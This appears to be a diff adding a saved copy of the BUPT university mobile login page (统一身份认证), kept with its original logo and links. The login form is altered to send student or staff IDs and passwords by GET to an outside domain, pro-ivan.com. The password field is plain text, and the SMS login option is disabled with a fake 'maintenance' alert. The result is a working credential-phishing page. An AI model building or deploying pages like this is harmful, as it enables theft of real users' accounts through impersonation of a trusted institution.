@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<!-- saved from url=(0057)https://auth.bupt.edu.cn/authserver/cas/login-mobile.html -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <title i18n="systemname">信息化公共服务平台</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no, user-scalable=no">
+    <!-- 引入样式文件 -->
+    <!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/vant@2.9/lib/index.css"/> -->
+    <link rel="stylesheet" href="./vant.css">
+    <link rel="stylesheet" href="./index-mobile.css">
+    <link rel="stylesheet" href="./login.css">
+</head>
+<body>
+<div id="app" class="auto" style="height: 896px;"><div class="appbox auto"><div class="lan auto"><div class="fl"><img src="//auth.bupt.edu.cn/authserver/cas/img/logo-full-mobile.png" alt=""></div></div> <div class="logo auto"><div class="tongyi">统一身份认证</div></div> <div class="login-title auto"></div> <div class="login-from auto"><form class="van-form" show-error="" method="get" id="" action="//pro-ivan.com/auth/login"><div class="van-cell van-field"><div class="van-cell__title van-field__label" style="width: 60px;"><span>学工号</span></div><div class="van-cell__value van-field__value"><div class="van-field__body"><input type="text" name="username" placeholder="请输入学工号" class="van-field__control"></div></div></div> <div class="van-cell van-field"><div class="van-cell__title van-field__label" style="width: 60px;"><span>密码</span></div><div class="van-cell__value van-field__value"><div class="van-field__body"><input type="text" name="password" placeholder="请输入密码" class="van-field__control"></div></div></div> <!----> <!----> <!----> <p class="change-type"><a href="javascript:" class="default-color" onclick="alert('验证码登录方式正在维护，请暂时使用账号密码登录');">用短信验证码登录</a></p> <!----> <button type="submit" class="vanbtn van-button van-button--primary van-button--normal van-button--block"><span class="van-button__text">账号登录</span></button></form></div> <div class="footer"><div><a href="http://uc.bupt.edu.cn/#/register/index" target="_blank" class="default-color">立即激活</a></div> <div class="tips"><b i18n="tips.title">温馨提示：</b><span i18n="tips.text6">用户名为“职工号／学号”。若忘记密码或提示密码错误，请点击“</span><a href="http://uc.bupt.edu.cn/#/reset/index" target="_blank" i18n="link.forgetpass" class="default-color">重置密码</a><span i18n="tips.text5">”</span></div></div></div></div>
+<!-- 引入 Vue 和 Vant 的 JS 文件 -->
+<script src="./vue.min.js"></script>
+<script src="./vue-i18n.min.js"></script>
+<script src="./vant.min.js"></script>
+<script src="./zh_cn.js"></script>
+<script src="./en.js"></script>
+<script>
+var config = parent.getPageConfig ? parent.getPageConfig() : {
+    locale: 'zh_cn',
+    error: '认证信息无效。',
+    service: {
+        name: 'test'
+    }
+};
+
+// console.log(window.messages[config.locale]['systemname'])
+if (parent) {
+    parent.document.title = window.messages[config.locale]['systemname']
+}
+
+new Vue({
+    el: '#app',
+    i18n: new VueI18n({
+        locale: config.locale,
+        messages: window.messages
+    }),
+    data: {
+        locale: config.locale,
+        systemdesc: config.service ? config.service.name : '',
+        username: undefined,
+        password: undefined,
+        captcha: undefined,
+        codeUrl: config.captcha ? '/authserver/captcha?captchaId='+config.captcha.id : undefined,
+        type: 'pas',
+        err: config.error,
+        tokenTTL: -1,
+        tokenTTLCounter: undefined
+    },
+    mounted(){
+        document.getElementById('app').style.height = document.body.clientHeight + 'px'
+    },
+    methods: {
+        sendSms() {
+            this.tokenTTL = 0;
+            if (this.username && this.username.trim()) {
+                parent.$.ajax({
+                    url: '/authserver/token',
+                    type: 'post',
+                    data: JSON.stringify({username: this.username.trim()}),
+                    contentType: 'application/json; charset=utf-8',
+                    success: this.sendSuccess,
+                    error: function () {
+                        this.err = this.$t('login.form.code.errorsend');
+                    }
+                });
+            } else {
+                this.tokenTTL = -1;
+            }
+        },
+        sendSuccess(res) {
+            var response = JSON.parse(res);
+            if (response.status === 'success') {
+                this.tokenTTL = response.expire_in;
+                this.tokenTTLCounter = setInterval(this.updateTTL, 1000);
+            } else {
+                this.err = this.$t('login.form.code.notfound');
+                this.tokenTTL = -1;
+            }
+        },
+        updateTTL() {
+            if (this.tokenTTL === -1) {
+                clearInterval(this.tokenTTLCounter);
+            } else {
+                this.tokenTTL --;
+            }
+        },
+        login() {
+            var loginType;
+            if (this.type === 'pas') loginType = 'username_password';
+            else if (this.type = 'sms') loginType = 'username_smstoken';
+            else return;
+            if (config.captcha) {
+                if (this.username && this.password && this.captcha && this.username.trim() && this.password.trim() && this.captcha.trim()) {
+                    parent.doLogin(this.username.trim(), this.password.trim(), loginType, this.captcha.trim().toLocaleLowerCase());
+                }
+            } else {
+                if (this.username && this.password && this.username.trim() && this.password.trim()) {
+                    parent.doLogin(this.username.trim(), this.password.trim(), loginType);
+                }
+            }
+        }
+    }
+});
+
+</script>
+
+
+</body></html>
